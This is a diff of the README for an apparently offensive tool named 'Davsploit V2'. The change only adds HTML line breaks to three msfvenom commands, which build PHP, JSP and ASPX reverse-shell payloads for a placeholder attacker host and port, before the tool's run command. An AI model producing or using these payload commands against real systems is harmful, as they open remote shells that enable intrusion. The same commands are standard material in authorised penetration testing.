@@ -35,10 +35,10 @@ Davsploit V2
 Run
 ===============
 Create a PHP reverse shell
-- msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
+- msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php<br>
 Create a JSP reverse shell
-- msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<Port> -f raw > shell.jsp
+- msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<Port> -f raw > shell.jsp<br>
 Create a ASPX reverse shell
-- msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<Port> -f aspx > shell.aspx
+- msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<Port> -f aspx > shell.aspx<br>
 
 python3 DAVSploit.py
